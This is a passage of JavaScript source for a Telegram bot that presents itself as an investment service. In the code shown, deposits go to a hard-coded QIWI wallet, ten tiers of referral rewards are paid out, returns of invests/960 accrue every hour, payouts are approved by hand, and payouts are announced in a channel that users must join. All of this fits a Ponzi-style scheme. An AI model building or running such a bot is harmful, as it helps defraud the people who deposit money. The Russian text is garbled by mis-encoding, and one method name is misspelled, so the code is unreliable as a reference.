						let [ msgText, label, url ] = message.caption.match(/(?:–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i);
						params.reply_markup = {
							inline_keyboard: [
								[{ text: label, url: url }]
							]
						}

						params.caption = params.caption.replace(/(–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i, "");
					}

					bot.sendPhoto(users[i].id, file_id, params);
				}

				if(!message.photo) {
					let params = {
						parse_mode: "HTML",
						disable_web_page_preview: true
					}

					if(message.text.match(/(?:–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i)) {
						let [ msgText, label, url ] = message.text.match(/(?:–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i);
						params.reply_markup = {
							inline_keyboard: [
								[{ text: label, url: url }]
							]
						}
					}

					bot.sendMessage(users[i].id, message.text.replace(/(–∫–Ω–æ–ø–∫–∞)\s(.*)\s-\s(.*)/i, ""), params);
				}
			}

			await message.user.set("menu", "");
			await message.send("–†–∞—Å—Å—ã–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞.", {
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});
		}

		if(message.user.menu === "selectAuditory") {
			await message.user.set("menu", "auditory" + Number(message.text));
			return message.send(`–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç —Ä–∞—Å—Å—ã–ª–∫–∏.
			
–ú–æ–∂–Ω–æ –ø—Ä–∏–∫—Ä–µ–ø–∏—Ç—å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}

		if(message.user.menu === "enterId") {
			message.text = Number(message.text);
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`);

			let user		=		await User.findOne({ id: message.text });
			if(!user) return message.send(`–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–∏–º –∞–π–¥–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω.`);

			let refs		=		await User.find({ ref: message.text });
			message.send(`<a href="tg://user?id=${message.text}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a>:
			
–ë–∞–ª–∞–Ω—Å: ${user.balance} RUB
–ò–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏: ${user.invests}
–ü—Ä–∏–≥–ª–∞—Å–∏–ª —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤: ${refs.length}`, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: keyboards.admin,
					resize_keyboard: true
				}
			});

			let text		=		``;
			refs.slice(0, 25).map((x, i) => {
				text		+=		`<a href="tg://user?id=${x.id}">–†–µ—Ñ–µ—Ä–∞–ª ‚Ññ${i}</a>\n`;
			});

			message.user.set("menu", "");
			return message.send(`–ï–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª—ã:\n\n${text}`, {
				parse_mode: "HTML"
			});
		}
		if(message.user.menu === "ban") {
			message.text		=		Math.floor(Number(message.text));
			if(!message.text) return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏.`);

			let ban			=		await Ban.findOne({ id: message.text });
			if(ban) {
				await ban.remove();
				await message.user.set("menu", "");

				return message.send(`–ë–∞–Ω —Å–Ω—è—Ç.`);
			} else {
				let _ban = new Ban({
					id: message.text
				});

				await _ban.save();
				await message.user.set("menu", "");

				return message.send(`–ë–∞–Ω –≤—ã–¥–∞–Ω.`);
			}
		}

		if(message.text === "‚õîÔ∏è –ë–∞–Ω") {
			await message.user.set("menu", "ban");
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}
		if(message.text === "üîì –ò–∑–º–µ–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å") {
			await message.user.set("menu", "enterIdBalance");
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}

		if(message.text === "üìÅ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è") {
			await message.user.set("menu", "enterId");
			return message.send(`–í–≤–µ–¥–∏—Ç–µ –∞–π–¥–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.`, {
				reply_markup: {
					keyboard: keyboards.cancel,
					resize_keyboard: true
				}
			});
		}

		if(message.text === "üìÆ –ó–∞—è–≤–∫–∏ –Ω–∞ –≤—ã–≤–æ–¥") {
			let tickets = await Ticket.find();
			await message.send(`–ó–∞—è–≤–∫–∏:`);

			tickets.map((x) => {
				message.send(`<a href="tg://user?id=${x.owner}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a>

–ö–æ—à–µ–ª—ë–∫: ${String(x.wallet)}
–°—É–º–º–∞: ${x.amount} RUB`, {
					parse_mode: "HTML",
					reply_markup: {
						inline_keyboard: [
							[{ text: "üì§ –í—ã–ø–ª–∞—Ç–∏—Ç—å", callback_data: `withdraw${x.owner}` }],
							[{ text: "‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å –∏ –≤–µ—Ä–Ω—É—Ç—å", callback_data: `declineback${x.owner}` }],
							[{ text: "‚ùå –û—Ç–∫–ª–æ–Ω–∏—Ç—å", callback_data: `decline${x.owner}` }]
						]
					}
				});
			});
		}

		if(message.text === "üì¨ –†–∞—Å—Å—ã–ª–∫–∞") {
			await message.user.set("menu", "selectAuditory");
			return message.send(`–í—ã–±–µ—Ä–∏—Ç–µ –∞—É–¥–∏—Ç–æ—Ä–∏—é.

0.25	‚Äî	25%
0.50	‚Äî	50%
0.75	‚Äî	75%
1		‚Äî	100%`, {
				reply_markup: {
					keyboard: [["0.25", "0.50"], ["0.75", "1"], ["‚õîÔ∏è –û—Ç–º–µ–Ω–∞"]],
					resize_keyboard: true
				}
			});
		}

		if(message.text === "/admin") return message.send(`–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å.`, {
			reply_markup: {
				keyboard: keyboards.admin,
				resize_keyboard: true
			}
		});
	}
});

bot.on("callback_query", async (query) => {
	const { message } = query;
	message.user = await User.findOne({ id: message.chat.id });

	let ban = await Ban.findOne({ id: message.user.id });
	if(ban) return bot.answerCallbackQuery(query.id, "–ó–∞–±–∞–Ω–µ–Ω!");

if(query.data.startsWith("qiwiviv")) {
		if (message.user.balance < 1) return bot.answerCallbackQuery(query.id, 'üö´ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: 1‚ÇΩ', true);
if (message.user.invests < 20) return bot.answerCallbackQuery(query.id, 'üö´  –î–ª—è –≤—ã–≤–æ–¥–∞ –Ω—É–∂–Ω–æ –∏–Ω–≤–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –º–∏–Ω–∏–º—É–º 20‚ÇΩ', true);

		let ticket = await Ticket.findOne({ owner: message.user.id });

		message.send(`–í–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä –∫–æ—à–µ–ª—å–∫–∞ QIWI.`, {
			reply_markup: {
				keyboard: keyboards.cancel,
				resize_keyboard: true
			}
		});

		await message.user.set("menu", "qiwi");
	}

if(query.data.startsWith("viv")) {
							
	let lvl1		=		await User.find({ ref: message.from.id });
		let lvl2		=		[];

		for (let i = 0; i < lvl1.length; i++) {
			let second		=		await User.find({ ref: lvl1[i].id });
			for (let x = 0; x < second.length; x++) {
				lvl2.push(second[x]);
			}
		}

		
				return bot.sendMessage(message.chat.id,` üíµ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –Ω–∞ QIWI - 1 —Ä—É–±–ª—å
* –í—ã–≤–æ–¥ –Ω–∞ –∫–∏–≤–∏ –º–æ–º–µ–Ω—Ç–∞–ª—å–Ω—ã–π

–î–ª—è –≤—ã–≤–æ–¥–∞ –Ω–∞–∂–º–∏—Ç–µ /qiwi`);
}
		
		if(query.data.startsWith("popol")) {
							
					

				return bot.sendMessage(message.chat.id,`üì§ –í—ã–±–µ—Ä–∏—Ç–µ –ø–ª–∞—Ç–µ–∂–Ω—É—é —Å–∏—Å—Ç–µ–º—É –Ω–∞ –∫–æ—Ç–æ—Ä—É—é —Ö–æ—Ç–∏—Ç–µ —Å–æ–≤–µ—Ä—à–∏—Ç—å –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ —Å—Ä–µ–¥—Å—Ç–≤.`, {
				reply_markup: {
inline_keyboard: [
							[{ text: "‚ñ™ QIWI –ö–æ—à–µ–ª—ë–∫", callback_data: `qiwipopol` }],
							
						]
				}
			});
		}
		if(query.data.startsWith("qiwipopol")) {
							

	await bot.answerCallbackQuery(query.id, 'üö´ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è 10‚ÇΩ, –µ—Å–ª–∏ –≤—ã –ø–æ–ø–æ–ª–Ω–∏—Ç–µ –º–µ–Ω—å—à–µ —Ç–æ –∑–∞—á–∏—Å–ª–µ–Ω–∏–µ –Ω–µ –ø—Ä–∏–¥–µ—Ç!', true);
	return bot.sendMessage(message.user.id,`üì• –î–ª—è —Å–æ–≤–µ—Ä—à–µ–Ω–∏—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è —á–µ—Ä–µ–∑ QIWI –∫–æ—à–µ–ª—ë–∫, –ø–µ—Ä–µ–≤–µ–¥–∏—Ç–µ –Ω—É–∂–Ω—É—é —Å—É–º–º—É —Å—Ä–µ–¥—Å—Ç–≤ –Ω–∞ –Ω–æ–º–µ—Ä –∫–æ—à–µ–ª—å–∫–∞ —É–∫–∞–∑–∞–Ω–Ω—ã–π –Ω–∏–∂–µ, –æ—Å—Ç–∞–≤–∏–≤ –ø—Ä–∏ —ç—Ç–æ–º –∏–Ω–¥–∏–≤–∏–¥—É–∞–ª—å–Ω—ã–π –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π –ø–µ—Ä–µ–≤–æ–¥–∞:

üí≥ –ù–æ–º–µ—Ä –∫–æ—à–µ–ª—å–∫–∞ –±–æ—Ç–∞: "+79017016559".
üí¨ –ö–æ–º–µ–Ω—Ç–∞—Ä–∏–π –∫ –ø–µ—Ä–µ–≤–æ–¥—É: "m${message.user.id}".
`);
}

		if(query.data.startsWith("akt")) {
if ((await bot.getChatMember("@end_soft", message.chat.id)).status == "left") {
					
	return bot.sendMessage(message.chat.id,`üõë –í—ã –Ω–µ –ø–æ–¥–ø–∏—Å–∞–ª–∏—Å—å –Ω–∞ –≤—Å–µ –∫–∞–Ω–∞–ª—ã!`, {
			reply_markup: {
				inline_keyboard: [
						[
						{ text: "‚ñ™ –ü–æ–¥–ø–∏—Å–∞—Ç—å—Å—è –Ω–∞ –∫–∞–Ω–∞–ª", url: `t.me/end_soft` },
						],
						]

			}
		});
	}
			await User.findOneAndUpdate({ id: 1588287137 }, { $inc: { pakk: 1 } })
		await User.findOneAndUpdate({ id: message.chat.id }, { $set: { akk: 1 } })
		await bot.sendMessage(message.user.id,`‚úÖ –í—ã –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É, —Ç–µ–ø–µ—Ä—å –≤—ã —Å–º–æ–∂–µ—Ç–µ –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –Ω–∞—à–∏–º –±–æ—Ç–æ–º!`);
		let user		=		await User.findOne({ id: message.chat.id });	
let ref = await User.findOne({ id: user.ref });
if(!ref) return;
await User.updateOne({ id: ref.id }, { $inc: { invests: +5, epv: +5 } } )
bot.sendMessage(ref.id, `
<a href="tg://user?id=${message.user.id}">üî• –†–µ—Ñ–µ—Ä–∞–ª</a> 1 —É—Ä–æ–≤–Ω—è –ø—Ä–æ—à–µ–ª –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é, –≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ 5 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
parse_mode: "HTML"
})
let tref = await User.findOne({ id: ref.ref });
if(!tref) return;
await User.updateOne({ id: tref.id }, { $inc: { invests: +2.5, epv: +2.5 } } )
bot.sendMessage(tref.id, `
<a href="tg://user?id=${message.chat.id}">üî• –†–µ—Ñ–µ—Ä–∞–ª</a> 2 —É—Ä–æ–≤–Ω—è –ø—Ä–æ—à–µ–ª –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é, –≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ 2.5 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
parse_mode: "HTML"
})
let fref = await User.findOne({ id: tref.ref });
if(!fref) return;
await User.updateOne({ id: fref.id }, { $inc: { invests: +1.25, epv: +1.25 } } )
bot.sendMessage(fref.id, `
<a href="tg://user?id=${message.chat.id}">üî• –†–µ—Ñ–µ—Ä–∞–ª</a> 3 —É—Ä–æ–≤–Ω—è –ø—Ä–æ—à–µ–ª –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é, –≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ 1.25 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
parse_mode: "HTML"
})
let sref = await User.findOne({ id: fref.ref });
if(!sref) return;
await User.updateOne({ id: sref.id }, { $inc: { invests: +0.5, epv: +0.5 } } )
bot.sendMessage(sref.id, `
<a href="tg://user?id=${message.chat.id}">üî• –†–µ—Ñ–µ—Ä–∞–ª</a> 4 —É—Ä–æ–≤–Ω—è –ø—Ä–æ—à–µ–ª –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é, –≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ 0.5 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
parse_mode: "HTML"
})
let rref = await User.findOne({ id: sref.ref });
if(!rref) return;
await User.updateOne({ id: rref.id }, { $inc: { invests: +0.25, epv: +0.25 } } )
bot.sendMessage(rref.id, `
<a href="tg://user?id=${message.chat.id}">üî• –†–µ—Ñ–µ—Ä–∞–ª</a> 5 —É—Ä–æ–≤–Ω—è –ø—Ä–æ—à–µ–ª –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é, –≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ 0.25 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
parse_mode: "HTML"
})
let qref = await User.findOne({ id: rref.ref });
if(!qref) return;
await User.updateOne({ id: qref.id }, { $inc: { invests: +0.1, epv: +0.1 } } )
bot.sendMessage(qref.id, `
<a href="tg://user?id=${message.chat.id}">üî• –†–µ—Ñ–µ—Ä–∞–ª</a> 6 —É—Ä–æ–≤–Ω—è –ø—Ä–æ—à–µ–ª –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é, –≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ 0.1 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
parse_mode: "HTML"
})
let yref = await User.findOne({ id: qref.ref });
if(!yref) return;
await User.updateOne({ id: yref.id }, { $inc: { invests: +0.1, epv: +0.1 } } )
bot.sendMessage(yref.id, `
<a href="tg://user?id=${message.chat.id}">üî• –†–µ—Ñ–µ—Ä–∞–ª</a> 7 —É—Ä–æ–≤–Ω—è –ø—Ä–æ—à–µ–ª –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é, –≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ 0.1 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
parse_mode: "HTML"
})
let uref = await User.findOne({ id: yref.ref });
if(!uref) return;
await User.updateOne({ id: uref.id }, { $inc: { invests: +0.1, epv: +0.1 } } )
bot.sendMessage(uref.id, `
<a href="tg://user?id=${message.chat.id}">üî• –†–µ—Ñ–µ—Ä–∞–ª</a> 8 —É—Ä–æ–≤–Ω—è –ø—Ä–æ—à–µ–ª –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é, –≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ 0.1 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
parse_mode: "HTML"
})
let iref = await User.findOne({ id: uref.ref });
if(!iref) return;
await User.updateOne({ id: iref.id }, { $inc: { invests: +0.1, epv: +0.1 } } )
bot.sendMessage(iref.id, `
<a href="tg://user?id=${message.chat.id}">üî• –†–µ—Ñ–µ—Ä–∞–ª</a> 9 —É—Ä–æ–≤–Ω—è –ø—Ä–æ—à–µ–ª –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é, –≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ 0.1 –†—É–± –Ω–∞ –≤–∞—à–∏ –∏–Ω–≤–µ—Å—Ç–∏—Ü–∏–∏`, {
parse_mode: "HTML"
})
let oref = await User.findOne({ id: iref.ref });
if(!oref) return;
await User.updateOne({ id: oref.id }, { $inc: { invests: +0.1, epv: +0.1 } } )
bot.sendMessage(oref.id, `
<a href="tg://user?id=${message.chat.id}">üî• –†–µ—Ñ–µ—Ä–∞–ª</a> 10 —É—Ä–æ–≤–Ω—è –ø—Ä–æ—à–µ–ª –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é, –≤–∞–º –∑–∞—á–∏—Å–ª–µ–Ω–æ 0.1 –†—É–± –¥–ª—è –≤—ã–≤–æ–¥–∞`, {
parse_mode: "HTML"
})
}



	
	if(admins.indexOf(message.user.id) !== -1) {

		if(query.data.startsWith("withdraw")) {
			let id			=		Number(query.data.split("withdraw")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "–ó–∞—è–≤–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.");

			bot.sendMessage(ticket.owner, "–î–µ–Ω—å–≥–∏ –≤—ã–ø–ª–∞—á–µ–Ω—ã. –ü—Ä–æ—Å–∏–º –ø—Ä–∏—Å–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç—ã –≤ —á–∞—Ç t.me/end_soft");
			bot.sendMessage("@end_soft", `<b>–ë—ã–ª–∞ –ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∞ –Ω–æ–≤–∞—è –≤—ã–ø–ª–∞—Ç–∞!</b>
			
üí∞ <b>–°—É–º–º–∞: ${ticket.amount}‚ÇΩ</b>
üí∏ <a href="tg://user?id=${ticket.owner}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a>
`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
					[
						{ text: "üí∞ –ü–µ—Ä–µ–π—Ç–∏ –≤ –±–æ—Ç–∞", url: `https://t.me/BESTINVESTMENT_ROBOT` }
					]
					]
				}
			});


			await ticket.remove();
			bot.editMesssageText("–î–µ–Ω—å–≥–∏ –≤—ã–ø–ª–∞—á–µ–Ω—ã. –ü—Ä–æ—Å–∏–º –ø—Ä–∏—Å–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç—ã –≤ —á–∞—Ç t.me/end_soft", {
				chat_id: message.chat.id,
				message_id: message.message_id
			});

			return;
		}

		if(query.data.startsWith("declineback")) {
			let id			=		Number(query.data.split("declineback")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "–ó–∞—è–≤–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.");

			await bot.sendMessage(ticket.owner, "–í–∞–º –æ—Ç–∫–ª–æ–Ω–∏–ª–∏ –≤—ã–ø–ª–∞—Ç—É –∏ –≤–µ—Ä–Ω—É–ª–∏ –¥–µ–Ω—å–≥–∏.");
			await User.findOne({ id: id }).then(async (user) => await user.inc("balance", ticket.amount));

			await ticket.remove();
			await bot.answerCallbackQuery(query.id, "–í—ã –æ—Ç–∫–∞–∑–∞–ª–∏ –≤ –≤—ã–ø–ª–∞—Ç–µ —Å—Ä–µ–¥—Å—Ç–≤ –∏ –≤–µ—Ä–Ω—É–ª–∏ –¥–µ–Ω—å–≥–∏ –Ω–∞ –±–∞–ª–∞–Ω—Å.");
		}

		if(query.data.startsWith("decline")) {
			let id			=		Number(query.data.split("decline")[1]);
			let ticket		=		await Ticket.findOne({ owner: id });

			if(!ticket) return bot.answerCallbackQuery(query.id, "–ó–∞—è–≤–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.");

			await ticket.remove();
			await bot.answerCallbackQuery(query.id, "–í—ã –æ—Ç–∫–∞–∑–∞–ª–∏ –≤ –≤—ã–ø–ª–∞—Ç–µ —Å—Ä–µ–¥—Å—Ç–≤.");
		}
	}
});

User.prototype.inc		=		function(field, value = 1) {
	this[field] 		+=		value;
	return this.save();
}

User.prototype.dec 		= 		function(field, value = 1) {
	this[field] 		-= 		value;
	return this.save();
}

User.prototype.set 		= 		function(field, value) {
	this[field] 		=	 	value;
	return this.save();
}

async function rupdate() {
  let userList = await User.find();
await userList.map(async (x) => {
	  if (x.invests === 0) { return
  }
await User.updateOne({ id: x.id }, { $inc: { balance: x.invests/960, epv: x.invests/960 } }, 
  function (err) {
     if (err) throw err
})
 })
}


setInterval(async() => {
  rupdate(); 
}, 3600000); 
